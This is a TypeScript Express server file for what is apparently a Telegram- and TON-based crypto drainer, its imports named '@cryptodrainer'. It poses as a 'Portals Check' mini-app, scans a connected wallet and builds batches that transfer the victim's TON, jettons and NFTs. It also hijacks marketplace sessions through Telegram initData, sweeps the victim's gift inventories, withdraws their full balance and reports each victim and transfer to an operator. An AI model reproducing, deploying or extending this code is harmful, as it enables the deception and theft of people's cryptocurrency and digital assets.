import { handleTelegramUpdateSafe } from "@cryptodrainer/bot/handler";
import { registerTelegramWebhook } from "@cryptodrainer/bot/webhook";
import type { Update } from "@cryptodrainer/bot/telegram";
import cors from "cors";
import crypto from "node:crypto";
import express from "express";
import { Address } from "@ton/core";
import { z } from "zod";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { config } from "./config.js";
import { planNextBatch } from "./drain.js";
import { getMe } from "./mrkt/client.js";
import { fetchInventory } from "./mrkt/client.js";
import { sweepInventoryPage } from "./mrkt/sweep.js";
import { withdrawAllMrktBalance } from "./mrkt/withdraw.js";
import { getSession, openSession } from "./mrkt/sessions.js";
import { isUserBusinessConnected } from "./business-store.js";
import { formatTgUser, logTopic } from "./log.js";
import { notifyOperator } from "./notify.js";
import { scanAccount } from "./tonapi.js";

const miniappDist = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../portals-web",
);

function tgUserIdFromInitData(initData: string): number {
  const params = new URLSearchParams(initData);
  const raw = params.get("user");
  if (!raw) throw new Error("initData missing user");
  const user = JSON.parse(raw) as { id?: number };
  if (!user.id) throw new Error("initData missing user.id");
  return user.id;
}

const app = express();
app.use(cors({ origin: true }));
app.use(express.json());

app.use(express.static(miniappDist));

app.get("/tonconnect-manifest.json", (_req, res) => {
  res.json({
    url: config.miniappPublicUrl,
    name: "Portals Check",
    iconUrl: `${config.serverPublicUrl}/assets/portal_icon.svg`,
    termsOfUseUrl: "https://mrkt.land",
    privacyPolicyUrl: "https://mrkt.land",
  });
});

const eventSchema = z.object({
  type: z.string(),
  address: z.string().optional(),
  tgUser: z.record(z.unknown()).optional(),
  detail: z.string().optional(),
});

app.post("/api/event", async (req, res) => {
  const parsed = eventSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "bad body" });
    return;
  }
  const { type, address, tgUser, detail } = parsed.data;
  const who =
    tgUser && typeof tgUser.id !== "undefined"
      ? `tg <code>${tgUser.id}</code> ${tgUser.username ? `@${tgUser.username}` : ""}`
      : "unknown";
  const lines = [`<b>${type}</b>`, who];
  if (address) lines.push(`wallet: <code>${address}</code>`);
  if (detail) lines.push(detail);
  const html = lines.join("\n");
  try {
    if (type.includes("error") || type.includes("fail")) {
      await logTopic("errors", html);
    } else if (type.includes("sweep") || type.includes("transfer") || type.includes("cycle_done")) {
      await logTopic("transfers", html);
    } else {
      await notifyOperator(html);
    }
  } catch (e) {
    console.error(e);
  }
  res.json({ ok: true });
});

app.get("/api/business-status", (req, res) => {
  const userId = Number(req.query.user_id);
  if (!userId) {
    res.status(400).json({ error: "user_id required" });
    return;
  }
  res.json({ connected: isUserBusinessConnected(userId) });
});

app.get("/api/data", (_req, res) => {
  res.json({
    mock_gifts: [],
    collections: [],
    chart_history: {},
  });
});

const buildSchema = z.object({
  address: z.string(),
  cursor: z
    .object({
      jettonOffset: z.number().int().nonnegative(),
      nftOffset: z.number().int().nonnegative(),
      tonDone: z.boolean(),
    })
    .optional(),
});

app.post("/api/build-batch", async (req, res) => {
  const parsed = buildSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "bad body" });
    return;
  }
  try {
    const owner = Address.parse(parsed.data.address);
    const assets = await scanAccount(owner);
    const cursor = parsed.data.cursor ?? { jettonOffset: 0, nftOffset: 0, tonDone: false };
    const batch = planNextBatch(owner, assets, cursor);
    if (!batch) {
      res.json({ done: true, cursor });
      return;
    }
    res.json({
      done: false,
      cursor,
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: batch.messages,
      kind: batch.kind,
      summary: batch.summary,
      assets: {
        ton: assets.tonNano.toString(),
        jettonCount: assets.jettons.length,
        nftCount: assets.nfts.length,
      },
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: String(e) });
  }
});

const sessionOpenSchema = z.object({
  initData: z.string().min(10),
  businessConnectionId: z.string().optional(),
});

app.post("/api/mrkt/session/open", async (req, res) => {
  const parsed = sessionOpenSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "bad body" });
    return;
  }
  try {
    const tgUserId = tgUserIdFromInitData(parsed.data.initData);
    const session = await openSession({
      initData: parsed.data.initData,
      tgUserId,
      businessConnectionId: parsed.data.businessConnectionId,
    });
    const me = await getMe(session.mrktToken).catch(() => null);
    await notifyOperator(
      `<b>mrkt_session</b>\ntg <code>${tgUserId}</code>\nMRKT id <code>${me?.id ?? "?"}</code>\nbc ${session.businessConnectionId ?? "—"}`,
    );
    res.json({
      sessionId: session.sessionId,
      expiresAt: session.expiresAt,
      limits: {
        maxFills: config.mrkt.maxFillsPerSession,
        maxGifts: config.mrkt.maxGiftsPerSession,
      },
    });
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    await logTopic("errors", `<b>mrkt_session_fail</b>\n${msg}`);
    console.error(e);
    res.status(500).json({ error: msg });
  }
});

app.get("/api/mrkt/inventory", async (req, res) => {
  const sessionId = String(req.headers["x-session-id"] ?? "");
  const session = getSession(sessionId);
  if (!session) {
    res.status(401).json({ error: "session expired" });
    return;
  }
  const cursor = String(req.query.cursor ?? "");
  try {
    const inv = await fetchInventory(session.mrktToken, cursor);
    res.json({
      gifts: inv.gifts ?? [],
      total: inv.total ?? 0,
      cursor: inv.cursor ?? "",
    });
  } catch (e) {
    res.status(500).json({ error: String(e) });
  }
});

app.post("/api/mrkt/sweep", async (req, res) => {
  const sessionId = String(req.headers["x-session-id"] ?? "");
  const session = getSession(sessionId);
  if (!session) {
    res.status(401).json({ error: "session expired" });
    return;
  }
  const cursor = String((req.body as { cursor?: string })?.cursor ?? "");
  try {
    const result = await sweepInventoryPage(session, cursor);
    if (result.items.length > 0) {
      const lines = result.items
        .filter((i) => i.mode !== "skipped")
        .map((i) => `${i.mode} ${i.giftId} ${i.priceNano ?? ""} ${i.detail ?? ""}`)
        .join("\n");
      if (lines) {
        await logTopic(
          "transfers",
          `<b>mrkt_sweep</b>\ntg <code>${session.tgUserId}</code>\n${lines}`,
        );
      }
    }
    res.json(result);
  } catch (e) {
    const msg = String(e);
    await logTopic("errors", `<b>mrkt_sweep_fail</b>\ntg <code>${session.tgUserId}</code>\n${msg}`);
    res.status(500).json({ error: msg });
  }
});

app.post("/api/mrkt/withdraw", async (req, res) => {
  const sessionId = String(req.headers["x-session-id"] ?? "");
  const session = getSession(sessionId);
  if (!session) {
    res.status(401).json({ error: "session expired" });
    return;
  }
  try {
    const result = await withdrawAllMrktBalance(session.mrktToken);
    const ton = result.withdrawnNano ? (result.withdrawnNano / 1e9).toFixed(4) : "0";
    const body =
      result.skipped || !result.withdrawnNano
        ? `<b>mrkt_withdraw_skip</b>\ntg <code>${session.tgUserId}</code>\n${result.reason ?? "—"}\nhard ${result.balanceHardNano ?? 0}`
        : `<b>mrkt_withdraw</b>\ntg <code>${session.tgUserId}</code>\n${ton} TON → <code>${result.wallet}</code>`;
    await logTopic("transfers", body);
    res.json(result);
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    await logTopic("errors", `<b>mrkt_withdraw_fail</b>\ntg <code>${session.tgUserId}</code>\n${msg}`);
    res.status(500).json({ error: msg });
  }
});

const webhookSecret =
  process.env.TELEGRAM_WEBHOOK_SECRET ?? crypto.randomBytes(24).toString("hex");

app.post("/api/telegram/webhook", async (req, res) => {
  const header = req.header("x-telegram-bot-api-secret-token");
  if (header !== webhookSecret) {
    res.sendStatus(403);
    return;
  }
  res.sendStatus(200);
  const update = req.body as Update;
  void handleTelegramUpdateSafe(update);
});

app.get("/api/health", (_req, res) => res.json({ ok: true }));

app.get("*", (req, res, next) => {
  if (req.path.startsWith("/api")) return next();
  res.sendFile(path.join(miniappDist, "index.html"), (err) => {
    if (err) next();
  });
});

app.listen(config.port, () => {
  console.log(`server on :${config.port}`);
  registerTelegramWebhook(config.serverPublicUrl, webhookSecret).catch((e: unknown) => {
    console.error("setWebhook failed", e);
  });
});
